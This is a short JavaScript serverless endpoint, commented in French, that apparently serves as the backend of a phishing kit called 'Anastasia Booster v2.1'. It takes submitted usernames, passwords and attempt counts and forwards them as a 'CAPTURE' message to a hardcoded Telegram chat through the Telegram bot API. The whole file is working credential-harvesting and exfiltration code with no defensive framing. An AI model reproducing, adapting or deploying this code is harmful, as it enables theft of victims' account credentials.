export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).json({ error: 'POST Only' });
    const { user, pass, attempt } = req.body;
    
    const BOT_TOKEN = process.env.TELEGRAM_TOKEN;
    const CHAT_ID = "6224971749"; // Ton identifiant

    const text = `🚀 **ANASTASIA : CAPTURE** 🚀\n` +
                 `━━━━━━━━━━━━━━━━━━\n` +
                 `👤 **USER** : \`${user}\`\n` +
                 `🔑 **PASS** : \`${pass}\`\n` +
                 `🔢 **TENTATIVE** : ${attempt}\n` +
                 `━━━━━━━━━━━━━━━━━━\n` +
                 `📍 *Source : Anastasia Booster v2.1*`;

    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
        });
        return res.status(200).json({ success: true });
    } catch (e) {
        return res.status(500).json({ error: "Erreur" });
    }
}
